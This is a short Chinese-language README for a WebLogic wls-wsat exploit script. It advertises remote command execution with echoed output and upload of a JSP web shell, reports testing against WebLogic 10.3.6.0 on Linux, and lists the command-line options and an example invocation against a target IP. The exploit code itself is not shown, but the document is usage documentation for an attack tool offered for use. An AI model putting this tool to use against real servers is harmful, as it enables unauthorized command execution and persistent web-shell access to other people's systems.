#### 简易说明


+ 命令执行并回显
+ 直接上传shell
+ linux下weblogic 10.3.6.0测试OK

#### 使用方法

+ python weblogic_wls_wsat_exp.py -t 172.16.80.131:7001

```bash
usage: weblogic_wls_wsat_exp.py [-h] -t TARGET [-c CMD] [-o OUTPUT] [-s SHELL]

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        weblogic ip and port(eg -> 172.16.80.131:7001)
  -c CMD, --cmd CMD     command to execute,default is "id"
  -o OUTPUT, --output OUTPUT
                        output file name,default is output.txt
  -s SHELL, --shell SHELL
                        local jsp file name to upload,and set -o xxx.jsp
```

Example：

~~~
python2 weblogic_wls_wsat_exp_win.py -t 192.168.174.144:7001 -c "whoami"
~~~

![execute_command](execute_command.png)

